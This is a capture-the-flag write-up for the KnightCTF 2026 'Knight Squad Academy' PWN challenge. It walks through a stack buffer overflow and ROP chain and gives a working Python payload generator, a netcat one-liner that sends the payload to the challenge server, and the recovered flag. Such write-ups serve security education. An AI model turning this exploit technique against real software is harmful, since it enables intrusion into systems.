# Knight Squad Academy - PWN Challenge Writeup

**Challenge:** Knight Squad Academy  
**Category:** PWN   
**Flag:** `KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_}`

---

## Challenge Description

A binary executable `ksa_kiosk` simulating a Knight Squad Academy enrollment kiosk was provided. The challenge required exploiting a buffer overflow vulnerability to gain control of program execution and retrieve the flag.

**Target Server:** `nc 66.228.49.41 5000`

---

## Binary Analysis

### File Information
```
$ file ksa_kiosk
ksa_kiosk: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86-64.so.2, stripped
```

### Key Findings

1. **Menu System:** The binary presents a kiosk interface with 3 options:
   - Register cadet
   - Enrollment status  
   - Exit

2. **Vulnerability Location:** The "Register cadet" function (option 1) has a buffer overflow in the "Enrollment notes" field.

3. **Buffer Overflow Details:**
   - Buffer size: `0x70` bytes (112 bytes)
   - Read size: `0xf0` bytes (240 bytes)
   - Overflow: 128 bytes beyond buffer boundary

4. **Win Function:** Located at `0x4013ac` - reads and prints `./flag.txt`
   - Requires `%rdi` register to equal magic value `0x1337c0decafebeef`

5. **ROP Gadget:** `pop rdi; ret` found at `0x40150b`

---

## Exploitation Strategy

### Stack Layout
```
+------------------+
|   Buffer (112)   |  <- Enrollment notes input
+------------------+
|   Saved RBP (8)  |
+------------------+
|   Return Addr    |  <- Overwrite target
+------------------+
```

### ROP Chain
```
[120 bytes padding] + [pop_rdi gadget] + [magic value] + [win function]
```

1. **Padding:** 120 bytes (112 buffer + 8 saved RBP)
2. **pop rdi; ret:** `0x40150b` - pops next value into RDI
3. **Magic Value:** `0x1337c0decafebeef` - required argument
4. **Win Function:** `0x4013ac` - prints flag

---

## Exploit Code

### Python Payload Generator
```python
#!/usr/bin/env python3
"""
Knight Squad Academy - Buffer Overflow Exploit
Target: nc 66.228.49.41 5000
"""

import struct

# Addresses (little-endian)
POP_RDI = 0x40150b          # pop rdi; ret gadget
MAGIC = 0x1337c0decafebeef  # Required value in RDI
WIN_FUNC = 0x4013ac         # Win function that reads flag

# Build payload
padding = b'A' * 120        # 112 bytes buffer + 8 bytes saved RBP

payload = padding
payload += struct.pack('<Q', POP_RDI)    # pop rdi; ret
payload += struct.pack('<Q', MAGIC)       # value to pop into rdi
payload += struct.pack('<Q', WIN_FUNC)    # win function address

# Save to file
with open('payload.bin', 'wb') as f:
    f.write(payload)

print(f"[+] Payload generated: {len(payload)} bytes")
print(f"[+] Padding: 120 bytes")
print(f"[+] ROP Chain: pop_rdi -> 0x1337c0decafebeef -> win()")
```

### Bash Exploit Runner
```bash
#!/bin/bash
# Usage: ./exploit.sh

{ echo 1; echo AAAA; cat payload.bin; sleep 1; } | nc 66.228.49.41 5000
```

### One-Liner Exploit
```bash
{ echo 1; echo AAAA; cat payload.bin; sleep 1; } | nc 66.228.49.41 5000
```

---

## Execution Flow

1. **Connect** to `nc 66.228.49.41 5000`
2. **Select option 1** - Register cadet
3. **Enter any name** - "AAAA"
4. **Send overflow payload** in enrollment notes field
5. **ROP chain executes:**
   - `pop rdi` loads `0x1337c0decafebeef` into RDI
   - `ret` jumps to win function at `0x4013ac`
   - Win function validates RDI and prints flag

---

## Output

```
====================================================
             Knight Squad Academy
           Enrollment Kiosk  (v2.1)
====================================================
Authorized personnel only. All actions are audited.

1) Register cadet
2) Enrollment status
3) Exit
>
--- Cadet Registration ---
Cadet name:
> Enrollment notes:
> [Enrollment] Entry received.
Welcome, Cadet AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Please wait for assignment.
[Registry] Clearance badge issued:
Your Flag : KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_} ... Visit our website : knightsquad.academy
```

---

## Key Takeaways

1. **Classic Buffer Overflow:** Unbounded read into fixed-size buffer
2. **ROP Chain:** Used to bypass potential protections and set up function arguments
3. **Magic Value Check:** Common CTF pattern requiring specific register value
4. **x86-64 Calling Convention:** First argument passed in RDI register

---

## Tools Used

- `file` - Binary identification
- `strings` - String extraction
- `objdump` - Disassembly
- `nc` (netcat) - Network connection
- Python3 - Payload generation

---

**Author:** MR. Umair   
**Date:** January 20, 2026  
**Competition:** KnightCTF 2026
